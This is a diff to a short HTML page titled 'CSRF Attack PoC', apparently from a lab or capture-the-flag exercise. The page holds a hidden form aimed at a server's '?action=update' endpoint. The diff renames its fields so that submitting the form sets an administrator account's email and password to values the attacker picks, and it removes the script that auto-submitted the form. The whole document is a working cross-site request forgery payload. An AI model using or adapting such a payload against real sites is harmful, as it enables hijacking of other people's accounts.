@@ -5,13 +5,10 @@
 </head>
 <body>
     <h1>CSRF Attack PoC</h1>
-    <form id="csrfForm" action="http://10.10.0.6/?action=update" method="POST">
-        <input type="hidden" name="amount" value="admin@admin.com">
-        <input type="hidden" name="recipient" value="3214959532">
+    <form action="http://10.10.0.6/?action=update" method="POST">
+        <input type="hidden" name="email" value="admin@admin.com">
+        <input type="hidden" name="password" value="3214959532">
         <input type="submit" value="Submit">
     </form>
-    <script>
-        document.getElementById('csrfForm').submit();
-    </script>
 </body>
 </html>
